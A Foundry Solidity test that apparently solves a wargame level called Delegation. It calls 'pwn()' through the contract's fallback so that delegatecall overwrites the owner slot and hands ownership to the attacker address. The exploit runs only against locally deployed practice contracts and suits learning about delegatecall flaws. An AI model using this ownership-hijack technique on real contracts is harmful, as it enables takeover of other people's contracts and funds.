// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Delegation.sol";

contract DelegationTest is Test {
    Delegate public delegate;
    Delegation public delegation;
    address p = address(1337);
    address p2 = address(1338);

    function setUp() public {
        vm.deal(p, 1 ether);
        delegate = new Delegate(p2);
        delegation = new Delegation(address(delegate));
    }

    /// @dev Claim ownership
    function testAttack() public {
        vm.startPrank(p);
        /// @dev call the delegation contract with a non-existing function, triggering fallback. This calls the delegate pwn contract and sets owner in storage of delegation, making us the owner of delegation.
        address(delegation).call(abi.encodeWithSignature("pwn()"));
        vm.stopPrank();
        assertEq(delegation.owner(), p);
    }
}
